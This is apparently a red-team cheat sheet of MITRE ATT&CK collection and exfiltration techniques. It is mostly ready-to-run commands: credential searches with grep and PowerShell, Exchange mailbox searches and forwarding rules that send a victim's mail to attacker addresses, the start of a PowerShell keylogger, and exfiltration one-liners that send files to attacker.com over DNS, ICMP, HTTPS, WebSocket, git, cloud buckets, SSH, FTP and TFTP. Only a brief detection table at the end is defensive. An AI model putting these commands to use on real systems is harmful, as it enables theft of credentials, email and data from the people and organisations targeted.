# MITRE ATT&ACK: Collection (TA0009) & Exfiltration (TA0010)

---

## T1005: Data from Local System

```bash
# Search for sensitive files
find /home -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*" \) 2>/dev/null
find / -type f -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null

# Search for credentials
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "api_key\|apikey\|secret" /home/ 2>/dev/null

# Windows sensitive file search
Get-ChildItem C:\Users -Include *.txt,*.pdf,*.docx,*.xlsx -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Include *.conf,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

---

## T1114: Email Collection

### T1114.001: Local Email Collection
```powershell
# Outlook PST access
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$namespace.Folders | ForEach-Object { $_.Folders | ForEach-Object { $_.Items | ForEach-Object { $_.Subject } } }
```

### T1114.002: Remote Email Collection
```powershell
# Exchange PowerShell
$UserCredential = Get-Credential
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange.corp.com/PowerShell/ -Authentication Kerberos -Credential $UserCredential
Import-PSSession $Session -DisableNameChecking
Search-Mailbox -Identity victim@corp.com -SearchQuery "subject:password" -TargetMailbox attacker@corp.com -TargetFolder "Inbox"
```

### T1114.003: Email Forwarding
```powershell
# Add email forwarding rule
Set-Mailbox -Identity victim@corp.com -ForwardingAddress attacker@evil.com -DeliverToMailboxAndForward $true
```

---

## T1056: Input Capture

### T1056.001: Keylogging
```powershell
# PowerShell keylogger
$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
$API = Add-Type -MemberDefinition $signature -Name "Keylogger" -Namespace API -PassThru
```

### T1056.002: GUI Input Capture
- Fake login prompts (credential popup)
- Browser credential harvesting

### T1056.003: Web Portal Capture
- Phishing pages with credential collection
- Man-in-the-middle proxy with SSL stripping

### T1056.004: Credential API Hooking
- Hooking Windows Credential Management APIs
- LSASS hooking for credential capture

---

## T1002: Data Compressed

```bash
# Linux compression
tar -czvf data.tar.gz /target/directory
zip -r data.zip /target/directory
7z a -p data.7z /target/directory

# Windows compression
Compress-Archive -Path C:\data\* -DestinationPath C:\temp\data.zip
```

---

## T1020: Automated Exfiltration

```bash
# DNS exfiltration
cat data.txt | xxd -p | while read line; do nslookup "$line.attacker.com"; done

# ICMP exfiltration
python -c "import os; os.system('ping -p $(xxd -p data.txt) attacker.com')"

# HTTPS exfiltration
curl -X POST -d @data.txt https://attacker.com/upload

# WebSocket exfiltration
python -c "import websocket; ws = websocket.create_connection('wss://attacker.com/exfil'); ws.send(open('data.txt').read())"
```

---

## T1041: Exfiltration Over C2 Channel

- HTTP/HTTPS C2 channels with steganography
- DNS tunneling (dnscat2, iodine)
- ICMP tunneling (icmpsh, ptunnel)
- Cloud storage exfiltration (OneDrive, Google Drive, Dropbox)

---

## T1567: Exfiltration Over Web Service

### T1567.001: Exfiltration to Code Repository
```bash
# GitHub as exfil channel
git clone https://github.com/attacker/exfil-repo.git
cp data.txt exfil-repo/
git add .
git commit -m "update"
git push origin main
```

### T1567.002: Exfiltration to Cloud Storage
```bash
# AWS S3
aws s3 cp data.txt s3://attacker-bucket/

# Azure Blob
az storage blob upload --container-name data --file data.txt --name data.txt

# Google Cloud Storage
gsutil cp data.txt gs://attacker-bucket/
```

---

## T1048: Exfiltration Over Alternative Protocol

### T1048.001: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
```bash
# SSH tunnel for exfil
ssh -R 8080:localhost:80 user@attacker.com

# OpenSSL encrypted transfer
openssl aes-256-cbc -salt -in data.txt -out data.enc -pass pass:password
curl -X POST --data-binary @data.enc https://attacker.com/upload
```

### T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
```bash
# GPG encrypted exfil
gpg --encrypt --recipient attacker@evil.com data.txt
curl -X POST --data-binary @data.txt.gpg https://attacker.com/upload
```

### T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol
```bash
# FTP exfiltration
ftp -n attacker.com << EOF
user anonymous password
cd /upload
put data.txt
quit
EOF

# TFTP exfiltration
tftp attacker.com << EOF
put data.txt
quit
EOF
```

---

## Detection

| Technique | Detection |
|---|---|
| Data Staging | Large file operations, unusual compression activity |
| Email Forwarding | Audit logs for mailbox rule changes |
| Exfiltration | DLP alerts, unusual outbound traffic volume |
| DNS Tunneling | High volume of DNS queries to single domain |
| Cloud Exfil | CASB alerts, unusual cloud API activity |
| Keylogging | Sysmon Event ID 10 (process memory access) |
